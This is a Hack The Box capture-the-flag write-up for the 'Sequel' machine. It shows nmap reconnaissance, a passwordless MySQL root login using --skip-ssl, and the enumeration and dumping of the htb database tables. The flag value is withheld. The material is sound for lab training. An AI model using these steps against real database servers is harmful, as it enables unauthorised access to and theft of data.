# Sequel
#HTB #very-easy #databases #MySQL #authentication
## Target:
*Name:* Sequel

*IP:* 10.129.128.223
## Vulnerability:
MySQL `root` account was left without password, which allowed unauthenticated access to all databases.

## Steps:
#### 1) Reconnaissance
Used nmap to check for open ports.

**Code:**
```
nmap -sV 10.129.128.223
```
**Result:**
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-30 06:22 -0400
Nmap scan report for 10.129.128.223
Host is up (0.018s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 162.19 seconds
```
#### 2) Connection to mysql database
We'll try to connect as admin/root, as they are sometimes left with empty or default credentials

**Code:**
```
mysql -u root -h 10.129.128.223
```
**Result:**
```
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
```

We can use `--skip-ssl` option to skip ssl: 

**Code:**
```
mysql -u root -h 10.129.128.223 --skip-ssl
```
**Result:**
```
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 67
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```
We have successfully connected to mysql on the target machine as `root` without any password.

#### 3) Searching for the flag
First, we need to know the available databases using `SHOW DATABASES;` command:
```
MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.052 sec)
```
`information_schema`, `mysql` and `performance_schema` are default system databases that come with every MySQL/MariaDB installation, `htb` database is our target.

Second, we need to connect to `htb`: 
**Code:**
```
USE htb;
```
**Result:**
```
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]>
```

Third, we list the available tables in the `htb` database using the command:
**Code:**
```
show tables;
```
**Result:**
```
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.020 sec)
```

The database has only 2 tables, both are checked for the flag:
**Code:**
```
select * from users;
```
**Result:**
```
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
4 rows in set (0.017 sec)
```
**Code:**
```
select * from config;
```
**Result:**
```
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | <FLAG>                           |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.016 sec)
```
## Flag:
[Not disclosed — solve it yourself!]
## Key takeaway:
Connecting to exposed database services with default/empty credentials is possible, `root` with no password is a common misconfiguration that grants full access to all databases.
